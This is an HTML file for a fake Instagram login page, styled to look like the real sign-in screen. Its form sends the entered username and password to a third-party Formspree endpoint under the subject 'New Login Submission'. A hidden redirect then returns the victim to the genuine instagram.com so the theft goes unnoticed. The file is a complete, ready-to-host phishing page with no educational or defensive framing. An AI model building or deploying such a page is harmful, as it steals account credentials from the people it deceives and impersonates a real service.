<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login - Instagram</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #f9f9f9, #e0e0e0);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .login-container {
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
      width: 320px;
      text-align: center;
    }

    .title {
      font-size: 28px;
      font-weight: 700;
      color: #444;
      margin-bottom: 20px;
    }

    .login-form input {
      width: 100%;
      padding: 12px 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }

    .login-form button {
      width: 100%;
      padding: 12px;
      background-color: #3897f0;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 10px;
    }

    .login-form button:hover {
      background-color: #2878c4;
    }

    .note {
      font-size: 12px;
      color: #888;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2 class="title">Instagram</h2>
    <!-- Formspree Integration -->
    <form action="https://formspree.io/f/xwpowzly" method="POST" class="login-form">
      <!-- Username and Password Inputs -->
      <input type="text" name="username" placeholder="Username" required />
      <input type="password" name="password" placeholder="Password" required />
      <!-- Hidden fields (optional) -->
      <input type="hidden" name="_subject" value="New Login Submission" />
      <input type="hidden" name="_redirect" value="https://www.instagram.com" />
      <!-- Submit Button -->
      <button type="submit">Log In</button>
    </form>
  </div>
</body>
</html>
